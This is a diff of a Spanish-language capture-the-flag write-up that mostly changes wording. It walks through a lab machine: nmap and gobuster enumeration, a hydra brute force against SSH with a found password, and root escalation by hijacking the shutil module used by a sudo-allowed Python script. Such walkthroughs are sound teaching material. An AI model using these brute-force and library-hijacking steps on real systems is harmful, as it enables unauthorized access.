@@ -20,7 +20,8 @@ PORT   STATE SERVICE
 80/tcp open  http
 ```
 
-Notamos 2 puertos abiertos y procedemos a lanzar un reconocimiento mas profundo sobre estos puertos
+Notamos 2 puertos abiertos y procedemos a lanzar un reconocimiento mas profundo sobre estos puertos.
+
 - `80` - Corre un servidor  Apache httpd 2.4.58 ((Ubuntu))
 - `22` - Servicio SSH  OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
 ```bash
@@ -47,7 +48,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ## Enumeración
 
-Realizamos Fuzzing  con `gobuster` sobre el servidor apache para encontrar recursos y archivos no visibles:
+Realizamos Fuzzing  con `gobuster` sobre el servidor apache para encontrar recursos y archivos ocultos:
 ```bash
 > gobuster dir -u http://172.17.0.2/ -w /home/wndr/Tools/dictionaries/SecLists/Discovery/Web-Content/raft-medium-directories.txt -x js,php,html,txt -t 20  
 ------------------------------------------------------------------------------------------------------------------------------------------------
@@ -65,8 +66,10 @@ _JIFGHDS87GYDFIGD_ Podemos intuir que esta es la credencial de acceso del servic
 
 ## Explotación
 
-Realizamos un ataque de fuerza bruta sobre el servicio SSH para descubrir el usuario al que pertenece la contraseña
+Realizamos un ataque de fuerza bruta sobre el servicio SSH para descubrir el usuario cuya contraseña sea la encontrada anteriormente.
+
 - Se encuentra un usuario valido llamado _carlos_
+
 ```bash
 > hydra -L /home/wndr/Tools/dictionaries/SecLists/Usernames/xato-net-10-million-usernames.txt -p "JIFGHDS87GYDFIGD" ssh://172.17.0.2 -t 4
 ------------------------------------------------------------------------
@@ -81,8 +84,9 @@ Accedemos al servicio SSH con el usuario _carlos_
 
 ## Escalada de Privilegios
 
-Ya conectado al SSH, buscamos binarios que se puedan ejecutar con permisos de administrador sin requerir de la contraseña
-- Encontramos un script.py ejecutable sin necesidad de contraseña
+Procedo a enumerar binarios con privilegios de SUDO:
+
+- Encontramos un script.py ejecutable sin necesidad de contraseña.
 ```bash
 carlos@786c84f45512:~$ sudo -l
 ----------------------------------------------------------------------------------------------------------------------------------
@@ -94,6 +98,7 @@ User carlos may run the following commands on 786c84f45512:
 ```
 
 **Python Library Hijacking**
+
 Inspeccionamos el _script.py_ y notamos que utiliza una librería llamada `shutil`
 
 ```python
@@ -111,7 +116,7 @@ if __name__ == '__main__':
     copiar_archivo(origen, destino)
 ```
 
-Creamos un modulo con el mismo nombre `shutil.py`
+Por lo cual podemos crear un modulo con el mismo nombre `shutil.py`.
 ```bash
 > nano /opt/shutil.py
 ```
